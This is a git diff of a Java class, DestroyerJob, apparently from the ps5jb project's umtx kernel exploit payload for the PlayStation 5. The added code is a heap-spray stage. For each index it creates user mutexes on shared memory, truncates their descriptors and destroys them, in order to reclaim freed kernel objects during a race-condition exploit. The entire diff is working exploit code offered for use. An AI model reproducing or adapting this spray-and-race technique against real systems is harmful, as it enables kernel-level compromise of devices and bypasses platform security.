@@ -1,14 +1,12 @@
-package org.ps5jb.client.payloads.umtx;
+package org.ps5jb.client.payloads.umtx.impl1;
 
-import org.ps5jb.loader.Status;
 import org.ps5jb.sdk.core.SdkException;
+import org.ps5jb.sdk.include.UniStd;
+import org.ps5jb.sdk.include.machine.Param;
 import org.ps5jb.sdk.include.sys.CpuSet;
 import org.ps5jb.sdk.include.sys.RtPrio;
 import org.ps5jb.sdk.include.sys.Umtx;
-import org.ps5jb.sdk.include.sys.errno.BadFileDescriptorException;
-import org.ps5jb.sdk.include.sys.errno.InvalidValueException;
 import org.ps5jb.sdk.include.sys.errno.NotFoundException;
-import org.ps5jb.sdk.include.sys.errno.OutOfMemoryException;
 
 public class DestroyerJob extends CommonJob {
     private final State state;
@@ -39,6 +37,7 @@ public class DestroyerJob extends CommonJob {
 
     protected void work() {
         final Umtx umtx = new Umtx(this.libKernel);
+        final UniStd uniStd = new UniStd(this.libKernel);
         while (!this.state.raceDoneFlag.get()) {
             DebugStatus.debug("Starting loop");
 
@@ -65,6 +64,34 @@ public class DestroyerJob extends CommonJob {
                 // Expected
             } catch (SdkException e) {
                 DebugStatus.error("Performing destroy operation failed", e);
+            }
+
+            if (Config.toggleSprayOnDestroyThread) {
+                DebugStatus.notice("Spraying and praying");
+                for (int i = this.index; i < this.state.reclaimDescriptors.length; i = i + Config.MAX_DESTROYER_THREADS) {
+                    try {
+                        if (DebugStatus.isDebugEnabled()) {
+                            DebugStatus.debug("Creating secondary user mutex #" + i);
+                        }
+                        int descriptor = umtx.userMutexCreate(this.state.secondarySharedMemoryKeyAddress.inc(0x8 * i));
+
+                        if (DebugStatus.isDebugEnabled()) {
+                            DebugStatus.debug("Descriptor of secondary shared memory object #" + i + ": " + descriptor);
+                        }
+                        this.state.reclaimDescriptors[i] = descriptor;
+
+                        if (DebugStatus.isDebugEnabled()) {
+                            DebugStatus.debug("Truncating secondary shared memory object #" + i);
+                        }
+                        uniStd.ftruncate(descriptor, Param.ptoa(descriptor));
+
+                        DebugStatus.debug("Destroying secondary user mutex #" + i);
+                        umtx.userMutexDestroy(this.state.secondarySharedMemoryKeyAddress.inc(0x8 * i));
+                    } catch (SdkException e) {
+                        DebugStatus.error("Spray failed at iteration " + i, e);
+                    }
+                }
+                DebugStatus.notice("Spraying done");
             }
 
             // Notify that destroyer thread done its main job.
